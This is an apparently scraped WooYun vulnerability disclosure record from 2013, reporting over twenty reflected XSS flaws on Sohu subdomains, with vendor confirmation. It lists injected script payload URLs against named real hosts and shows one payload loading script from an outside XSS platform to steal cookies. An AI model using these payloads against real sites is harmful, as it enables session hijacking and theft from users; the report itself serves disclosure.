{"id": 62995, "wybug_id": "wooyun-2013-033442", "wybug_title": "sohu分站20多处反射性XSS", "wybug_corp": "搜狐", "wybug_author": "Spid3r", "wybug_date": "2013-08-05 11:03", "wybug_open_date": "2013-09-19 11:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向公众公开  简要描述：  20多处反射XSS... 其实反射XSS危害还是蛮大的.作为大厂商来讲就更加是了. 详细说明：  1、顾名思义，我们得先找到存在XSS漏洞的地方对吧，大概看了下，20多个地方存在XSS\nhttp://i.sohu.com/login/reg.do?bru=\"><script>alert('xss')</script>\n\nhttp://store.tv.sohu.com/web/content.do?pid=5513916&productId=2341&spayid=300006?pvid=\"><script src=http://xsserme.sinaapp.com/3fJr2o?1375544283></script>\n\nhttp://db.money.sohu.com/finxt/xtsearch.html?s.term=\"><script>alert('xss')</script>\n\nhttp://db.money.sohu.com/finxt/xtsearch.html?s.income=\"><script>alert('xss')</script>\n\nhttp://drug.health.sohu.com/Search/index?q=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n\nhttp://api.k.sohu.com/api/client/sendmsg.go?callback=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E;//\n\nhttp://jiu.sohu.com/searchprice.php?f=1&t=99&cateid=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n\nhttp://jiu.sohu.com/searchprice.php?q=&cateid=1&flavor=\"><script>alert('xss')</script>\n\nhttp://jiu.sohu.com/searchprice.php?q=&cateid=1&alcohol=&occasions=\"><script>alert('xss')</script>\n\nhttp://search.auto.sohu.com/suggest.jhtml?func=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&kw=&t=\nfunc  kw2个参数都有\nhttp://saa.auto.sohu.com/club/active-summary.shtml?status=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&type=1&province=-1\nstatus  type 2个参数都有\nhttp://mailinglist.corp.sohu.com/inputMail.jsp?type=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n\nhttp://m.i.sohu.com/m/auth/login/?next=h%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n\nhttp://db.money.sohu.com/finxt/touser.html?u.productName=%D6%DA%D2%E61322%C6%DA%28TOT%29&u.position=1001301001&u.productCode=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n3个参数都有.\nhttp://cfg.mini.sohu.com/setcookie.php?var=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E\n2、ok，现在我们找其中一例把代码换位盗取cookies的代码。\nhttp://i.sohu.com/login/reg.do?bru=\"><script src=http://xsserme.sinaapp.com/3fJr2o?1375544283></script>\n这里我就随便找了个XSS平台来演示下。然后可以去论坛发消息，各种消息，同样也可以私信给别人，我这里找的是一位朋友来帮忙测试的.3、成功盗取COOKIES\n\n有了cookies后面就不用说了吧。。。。很多厂商都不注重反射性XSS。。其实反射性XSS也是可以利用的，当然这可能受害最大的只是用户。但如果工作人员安全意识不是那么强的话，一样可以盲打的。。。。    漏洞证明：  以上XSS code 自行测试.这里只发2张图.\n\n\n\n   修复方案：  过滤.. 要是有公仔就更好了.   版权声明：转载请注明来源 Spid3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-08-05 12:31 厂商回复： 感谢支持。^_^ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}